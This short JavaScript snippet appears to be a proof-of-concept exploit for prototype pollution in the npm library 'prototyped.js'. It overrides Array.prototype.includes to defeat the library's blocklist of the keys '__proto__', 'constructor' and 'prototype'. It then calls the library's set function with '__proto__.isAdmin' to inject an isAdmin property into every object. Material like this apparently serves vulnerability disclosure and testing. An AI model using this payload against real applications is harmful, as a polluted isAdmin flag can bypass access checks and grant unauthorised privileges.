Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
console.log({}.polluted);
const set = require('prototyped.js/dist/object/set').default;
set({}, '__proto__.isAdmin', true);